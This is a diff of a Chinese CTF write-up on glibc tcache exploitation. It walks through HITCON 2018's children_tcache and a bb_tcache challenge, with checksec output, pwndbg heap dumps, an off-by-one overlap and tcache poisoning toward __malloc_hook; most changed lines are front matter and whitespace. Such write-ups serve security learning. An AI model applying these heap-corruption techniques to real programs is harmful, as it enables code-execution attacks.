@@ -1,14 +1,18 @@
 ---
-layout: post
-title:  "在Debug中学Tcache"
-date:   2018-11-28 20:00:00
-categories: 杂谈
-tags: WriteUp Pwn Tcache HITCON2018
+title: 在debug中学tcache
+author: nepire
+avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
+authorLink: 'https://nepire.github.io/'
+authorAbout: 逐梦者
+authorDesc: 逐梦者
+categories: 技术
+comments: true
+date: 2019-11-05 12:03:57
+tags:
+keywords:
+description:
+photos:
 ---
-
-* content
-{:toc}
-
 最近比赛Pwn的libc版本越来越多2.26以上的了，也就相当于多了不少tcache相关的题目，于是最近恶补了一波tcache机制相关的东西，并记录下tcache相关题目的调试
 
 本文首发于先知社区[在Debug中学Tcache](https://xz.aliyun.com/t/3419)
@@ -56,9 +60,9 @@ static __thread tcache_perthread_struct *tcache = NULL;
 我们先看下题目的基本信息，这里我是用了自己写的一个pwn环境来实现tcache的调试具体链接会在末尾放出
 
 ```bash
-➜  tcache file children_tcache 
+➜  tcache file children_tcache
 children_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ebf73572ad77a035a366578bf87c6aabc6a235a1, stripped
-➜  tcache checksec children_tcache 
+➜  tcache checksec children_tcache
 [*] '/home/ctf/process/tcache/children_tcache'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -71,14 +75,14 @@ children_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamic
 64位防护全开的程序，真的刺激，我们看下程序干了些什么
 
 ```bash
-➜  tcache ./children_tcache 
+➜  tcache ./children_tcache
 $$$$$$$$$$$$$$$$$$$$$$$$$$$
 🍊    Children Tcache    🍊
 $$$$$$$$$$$$$$$$$$$$$$$$$$$
 $   1. New heap           $
 $   2. Show heap          $
-$   3. Delete heap        $ 
-$   4. Exit               $ 
+$   3. Delete heap        $
+$   4. Exit               $
 $$$$$$$$$$$$$$$$$$$$$$$$$$$
 Your choice: 1
 Size:12
@@ -166,7 +170,7 @@ pwndbg> x/8x 0x565258e29250
 0x565258e29280:	0x0000000062626262	0x0000000000000000
 ```
 
-由于这题的出题人用0xda填充整个chunk，所以我们不能直接伪造pre_size来overlapping 
+由于这题的出题人用0xda填充整个chunk，所以我们不能直接伪造pre_size来overlapping
 
 ```c
 void delete()
@@ -188,7 +192,7 @@ void delete()
 }
 ```
 
-但我们刚刚才验证的null byte off-by-one溢出的字节为\x00，所以我们可以通过反复的利用这个把pre_size位清0来构造overlapping 
+但我们刚刚才验证的null byte off-by-one溢出的字节为\x00，所以我们可以通过反复的利用这个把pre_size位清0来构造overlapping
 
 ```python
 #poc
@@ -379,8 +383,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x55a661cd5270 (size : 0x20d90) 
-       last_remainder: 0x0 (size : 0x0) 
+                  top: 0x55a661cd5270 (size : 0x20d90)
+       last_remainder: 0x0 (size : 0x0)
             unsortbin: 0x0
 (0x20)   tcache_entry[0]: 0x55a661cd5260 --> 0x55a661cd5260 (overlap chunk with 0x55a661cd5250(freed) )
 
@@ -402,8 +406,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x55a464be82e0 (size : 0x20d20) 
-       last_remainder: 0x0 (size : 0x0) 
+                  top: 0x55a464be82e0 (size : 0x20d20)
+       last_remainder: 0x0 (size : 0x0)
             unsortbin: 0x0
 (0x90)   tcache_entry[7]: 0x55a464be8260
 
@@ -417,10 +421,10 @@ pwndbg> heapinfo
    21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
    22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
    23 	a[0] = (intptr_t)&stack_var;
-   24 
+   24
  ► 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
    26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
-   27 
+   27
    28 	intptr_t *b = malloc(128);
    29 	fprintf(stderr, "2nd malloc(128): %p\n", b);
    30 	fprintf(stderr, "We got the control\n");
@@ -444,8 +448,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x55a464be82e0 (size : 0x20d20) 
-       last_remainder: 0x0 (size : 0x0) 
+                  top: 0x55a464be82e0 (size : 0x20d20)
+       last_remainder: 0x0 (size : 0x0)
             unsortbin: 0x0
 (0x90)   tcache_entry[7]: 0x55a464be8260 --> 0x7ffe99bc1bb0 --> 0x55a4635689a0
 ```
@@ -455,9 +459,9 @@ pwndbg> heapinfo
 我们拿个例题来看看，这是山东省科来杯的一道简单pwn题，由于他给的libc就叫libc-2.27所以我们直接用ubuntu18.04的环境去调试，首先我们先看下题目的基本信息
 
 ```bash
-➜  bbtcache file bb_tcache 
+➜  bbtcache file bb_tcache
 bb_tcache: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=642e76244eb176cccd3e281014f18a7ea7551682, stripped
-➜  bbtcache checksec bb_tcache 
+➜  bbtcache checksec bb_tcache
 [*] '/home/Ep3ius/pwn/process/bbtcache/bb_tcache'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
@@ -520,8 +524,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x556b70596270 (size : 0x20d90) 
-       last_remainder: 0x0 (size : 0x0) 
+                  top: 0x556b70596270 (size : 0x20d90)
+       last_remainder: 0x0 (size : 0x0)
             unsortbin: 0x0
 (0x20)   tcache_entry[0]: 0x556b70596260
 ```
@@ -540,8 +544,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x556b70596270 (size : 0x20d90) 
-       last_remainder: 0x0 (size : 0x0) 
+                  top: 0x556b70596270 (size : 0x20d90)
+       last_remainder: 0x0 (size : 0x0)
             unsortbin: 0x0
 (0x20)   tcache_entry[0]: 0x556b70596260 --> 0x7f2d9da10c10 (&__malloc_hook)
 ```
@@ -552,7 +556,7 @@ pwndbg> heapinfo
 
 ```bash
 pwndbg> parseheap
-addr                prev                size                 status              fd                bk 
+addr                prev                size                 status              fd                bk
 0x564f27df9000      0x0                 0x250                Used                None              None
 0x564f27df9250      0x0                 0x510                Used                None              None
 0x564f27df9760      0x510               0x30                 Used                None              None
@@ -569,8 +573,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x556e12172ca0 (size : 0x20360) 
-       last_remainder: 0x556e12172790 (size : 0x4f0) 
+                  top: 0x556e12172ca0 (size : 0x20360)
+       last_remainder: 0x556e12172790 (size : 0x4f0)
             unsortbin: 0x556e12172790 (size : 0x4f0)
 (0x30)   tcache_entry[1]: 0x556e12172770
 pwndbg>
@@ -590,8 +594,8 @@ pwndbg> heapinfo
 (0x90)     fastbin[7]: 0x0
 (0xa0)     fastbin[8]: 0x0
 (0xb0)     fastbin[9]: 0x0
-                  top: 0x556e12172ca0 (size : 0x20360) 
-       last_remainder: 0x556e12172790 (size : 0x4f0) 
+                  top: 0x556e12172ca0 (size : 0x20360)
+       last_remainder: 0x556e12172790 (size : 0x4f0)
             unsortbin: 0x556e12172790 (size : 0x4f0)
 (0x30)   tcache_entry[1]: 0x556e12172770 --> 0x556e12172770 (overlap chunk with 0x556e12172760(freed) )
 ```
